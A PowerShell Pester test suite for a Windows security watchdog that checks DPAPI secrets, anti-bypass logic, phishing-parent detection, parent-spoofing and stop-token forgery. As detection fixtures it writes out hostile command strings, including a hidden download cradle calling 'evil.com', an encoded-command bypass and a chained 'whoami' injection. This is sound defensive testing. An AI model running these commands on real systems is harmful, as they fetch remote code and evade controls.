# =====================================================================
# Security Sentinel Ultra v8.0 - Pester Unit Test Suite
# Tests: DPAPI, Anti-Bypass, Phishing, Parent-Spoofing Safe-Mode, Token Forgery
# =====================================================================

$ScriptRoot = Split-Path -Parent $PSScriptRoot
$WatchdogScript = Join-Path $ScriptRoot "core\SentinelWatchdog.ps1"

Describe "Security Sentinel Ultra v8.0 Enterprise Security Controls" {
    BeforeAll {
        if (-not (Test-Path $WatchdogScript)) {
            throw "SentinelWatchdog.ps1 not found at $WatchdogScript"
        }
        . $WatchdogScript -LibraryOnly
    }

    Context "1. DPAPI Secret Vault Verification" {
        It "Should correctly encrypt and decrypt strings using DPAPI with entropy" {
            $secret = "https://discord.com/api/webhooks/test/sample_enterprise_webhook_url"
            $encrypted = Protect-DpapiString -PlainText $secret
            $encrypted | Should Not BeNullOrEmpty
            $encrypted | Should Not Be $secret

            $decrypted = Unprotect-DpapiString -CipherBase64 $encrypted
            $decrypted | Should Be $secret
        }

        It "Should return empty string when decrypting corrupted ciphertext" {
            $corrupted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("CorruptedData"))
            $decrypted = Unprotect-DpapiString -CipherBase64 $corrupted
            $decrypted | Should Be ""
        }
    }

    Context "2. Dashboard Exemption Anti-Bypass" {
        It "Should strictly reject encoded command payloads attempting to bypass by appending script name" {
            $fakeBypassCmd = "powershell.exe -enc VGVzdFBheWxvYWQ= SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $fakeBypassCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands without -File parameter" {
            $noFileCmd = "powershell.exe -ExecutionPolicy Bypass SentinelDashboard.ps1"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $noFileCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject commands containing chaining operators (&&, ;, |)" {
            $chainCmd = "powershell.exe -File `"C:\Safe\SentinelDashboard.ps1`" && whoami"
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $chainCmd
            $isVerified | Should Be $false
        }

        It "Should strictly reject scripts from unauthorized temp directories" {
            $tempFake = "powershell.exe -File `"C:\Users\Public\SentinelDashboard.ps1`""
            $isVerified = Test-IsVerifiedSentinelScript -CommandLine $tempFake
            $isVerified | Should Be $false
        }
    }

    Context "3. Phishing Parent Process Detection & Macro Anomaly" {
        It "Should assign +50 risk score and CRITICAL alert when spawned by Office/Word macro" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
                                         -CommandLine "powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com')" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }

        It "Should assign +50 risk score when spawned by Acrobat/PDF Reader" {
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath "cmd.exe" `
                                         -CommandLine "cmd.exe /c start calc.exe" `
                                         -IsUnsigned $false -IsParentChildAnomaly $true -IsPhishingParent $true

            $triage.RiskScore | Should BeGreaterOrEqual 85
            $triage.Reasons | Should Contain "PhishingParentExploit(+50)"
        }
    }

    Context "4. Safe-Mode Zero-Trust Parent & Spoofing Defense (Real Inspect-SingleProcess)" {
        It "Should reject an unsigned malware binary in Temp named 'node.exe' from getting silent Safe-Mode pass" {
            $fakeNodeTemp = "C:\Users\victim\AppData\Local\Temp\node.exe"
            $triage = Get-ForensicTriage -ProcessId 0 -FilePath $fakeNodeTemp `
                                         -CommandLine "node.exe -e evil()" `
                                         -IsUnsigned $true -IsParentChildAnomaly $false -IsPhishingParent $false

            $triage.RiskScore | Should BeGreaterOrEqual 60
            $triage.Reasons | Should Contain "UnsignedBinary(+25)"
            $triage.Reasons | Should Contain "HighRiskPath(+20)"
        }

        It "Should reject Safe-Mode pass via Inspect-SingleProcess when parent steam.exe is spoofed in Temp" {
            $childProc = [PSCustomObject]@{
                ProcessId        = 8882
                Name             = "worker.exe"
                ExecutablePath   = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine      = "worker.exe --task"
                ParentProcessId  = 7772
            }
            $spoofedMap = @{
                7772 = [PSCustomObject]@{
                    ProcessId      = 7772
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Users\victim\AppData\Local\Temp\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $spoofedMap
            $res.Action | Should Not Be "AllowedWorkGamingSafeMode"
        }

        It "Should grant Safe-Mode pass via Inspect-SingleProcess when parent is genuine in Program Files" {
            $childProc = [PSCustomObject]@{
                ProcessId        = 8883
                Name             = "worker.exe"
                ExecutablePath   = "C:\Users\victim\AppData\Local\Temp\worker.exe"
                CommandLine      = "worker.exe --task"
                ParentProcessId  = 7773
            }
            $legitMap = @{
                7773 = [PSCustomObject]@{
                    ProcessId      = 7773
                    Name           = "steam.exe"
                    ExecutablePath = "C:\Program Files (x86)\Steam\steam.exe"
                }
            }
            $res = Inspect-SingleProcess -p $childProc -procMap $legitMap
            $res.Action | Should Be "AllowedWorkGamingSafeMode"
        }
    }

    Context "5. Stop Token Security, Token Forgery & Registry Vault Defense" {
        It "Should reject stop token generated for a different PID" {
            $valid = Test-AuthenticatedStopToken -ExpectedWatchdogPid "99999"
            $valid | Should Be $false
        }

        It "Should strictly reject stop token forged by attacker without HKLM secret" {
            $attackerPayload = "STOP|$PID|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())"
            $fakeEntropy = [System.Text.Encoding]::UTF8.GetBytes("ATTACKER_GUESS_SECRET_12345678901")
            $enc = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($attackerPayload), $fakeEntropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $tokenFile = Join-Path $StateDir "graceful_stop.token"
            [System.IO.File]::WriteAllText($tokenFile, [Convert]::ToBase64String($enc), [System.Text.Encoding]::UTF8)

            $res = Test-AuthenticatedStopToken -ExpectedWatchdogPid "$PID"
            $res | Should Be $false
        }

        It "Should strictly reject stop token replay attack with expired timestamp" {
            $expiredPayload = "STOP|$PID|$([DateTimeOffset]::UtcNow.AddSeconds(-120).ToUnixTimeSeconds())"
            $enc = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($expiredPayload), $script:SentinelEntropyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $tokenFile = Join-Path $StateDir "graceful_stop.token"
            [System.IO.File]::WriteAllText($tokenFile, [Convert]::ToBase64String($enc), [System.Text.Encoding]::UTF8)

            $res = Test-AuthenticatedStopToken -ExpectedWatchdogPid "$PID"
            $res | Should Be $false
        }

        It "Should ensure Zero-Trust: No InstallSecret stored in HKCU" {
            $hkcuSecretExists = $false
            if (Test-Path "HKCU:\Software\SecuritySentinel\IntegrityAnchor") {
                $val = (Get-ItemProperty -Path "HKCU:\Software\SecuritySentinel\IntegrityAnchor" -Name "InstallSecret" -ErrorAction SilentlyContinue).InstallSecret
                if ($val) { $hkcuSecretExists = $true }
            }
            $hkcuSecretExists | Should Be $false
        }
    }

    Context "6. Canary Decoy Integrity & Attribution" {
        It "Should correctly attribute SACL Event 4663 XML to target process" {
            $sampleXml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">TestUser</Data>
    <Data Name="ObjectName">C:\Users\victim\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x1404</Data>
    <Data Name="ProcessName">C:\Users\victim\Downloads\stealer.exe</Data>
  </EventData>
</Event>
"@
            $parsed = Parse-Event4663Xml -EventXmlString $sampleXml
            $parsed.ProcessId | Should Be 5124
            $parsed.ProcessName | Should Be "C:\Users\victim\Downloads\stealer.exe"
            $parsed.ObjectName | Should Match "SecuritySentinel_Canary"
        }
    }
}

# SIG # Begin signature block
# MIIF0QYJKoZIhvcNAQcCoIIFwjCCBb4CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAVEgl9/wFbyjb6
# 3SVLX5+kbCZPjiS7z0qkm1vJ2FsDV6CCAzIwggMuMIICFqADAgECAhBqicxAtgYy
# tEDV87OXYXwsMA0GCSqGSIb3DQEBCwUAMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNl
# bnRpbmVsIFVsdHJhIENvZGUgU2lnbmluZzAeFw0yNjExMDkxODA2NDBaFw0zMTEx
# MDkxODE2NDBaMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNlbnRpbmVsIFVsdHJhIENv
# ZGUgU2lnbmluZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMNKKvtK
# ERrpKZl/ygPwjprcar+6Xk/3xKwms9K7GDTSH8EYVjwFvMsNGB8+On0f31+3hmyt
# KZzePEl5panG4eomaJwGl5qLzD2qyJVAtpgRKh+fiUgjFgm+FOm46u74WMC/Jhr2
# UZe+h6PpO7eoAizbrVRHPaHIOSfIMxnQFVtkkV66T0O5ELGaqTsLZbeQRZsvf6pl
# mIRLQ7nDIzQ6HqRuaWYfU/GNB8/uDhymxuRyLVV6y6pJ/lO2plVgHwC1JHIT7M+S
# t6Fx8wOkUB9McT6P/T4uXHP56PufSxPC7Q4IgDBQ4sQr6NKqtxzVeZ8LBeZW9dsF
# /E1ggkQ3GpNEDmECAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoG
# CCsGAQUFBwMDMB0GA1UdDgQWBBTzQylDY2rNT15+NYtrGro9m44IMjANBgkqhkiG
# 9w0BAQsFAAOCAQEASGAB2FcY0MsNMQsmt1MEmkmsNWWM15Bf3/gojZQeA84NS39J
# Q3AvtZsrUFq7czi6dm0Oh5GtmEhBBaXxdQeZc48SviS1ZkH+ydm4wFNDz0htXqem
# K5iqgz9JWlYbO0Q1SpCwnrL2lqtXUTqnq1K83NVlyEfMJy1N/pve+DlOLEBjvPvr
# PJDNfUZ79skHaztddUvFUfRFIOaMr0sop2XozdqDsD3Au4im941zJTleYk7m+0Qx
# V0WFPnXMN88dI7JkFgmgmoT53b362u5EU9KHRnwLNjrGIb4+NpAH5QtH7Xl1hqde
# Hxvq+WiRbpJEMEiPyUN71mzSsOfIzKk16U4MIjGCAfUwggHxAgEBMEMwLzEtMCsG
# A1UEAwwkU2VjdXJpdHkgU2VudGluZWwgVWx0cmEgQ29kZSBTaWduaW5nAhBqicxA
# tgYytEDV87OXYXwsMA0GCWCGSAFlAwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAI
# oAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIB
# CzEOMAwGCisGAQQBgjcCARUwLwYJKoZIhvcNAQkEMSIEIEG9sZT40Qv+QOB1ZNhO
# 4gU+tef4QK131fnC+sppbtx9MA0GCSqGSIb3DQEBAQUABIIBAL0hR88XxqOySfto
# RbMCO7FxybjPLnCldLL3p/BVhvbAjnDeaikOQVE7tzBCXnR7Hm2uyDEwp1S+csCt
# wB0eBGd8ny80+VKRW9KUEa7tAYAt53wpYfUkYt5f4uvK0iXmOXu+tR/rp/rwMzSI
# 1YcXL6EVG3f+2nkUmbJhsG0csFPpN+G9l0AqOhKCALDM5ovC+QUTtdxprrfevxE8
# 2m9O1vW9F7R6MwvSc3it3UBSc4X/kHtKpLrfbUreoy9OjBNHCnXiWL6Lczf3eXoP
# CvhNNW9xh9NMqD9sDeOJPN+Iq2nND5PNM8QoG+Qc1QHK2COBBqbpq85/UhV4mm78
# A1bnXcY=
# SIG # End signature block
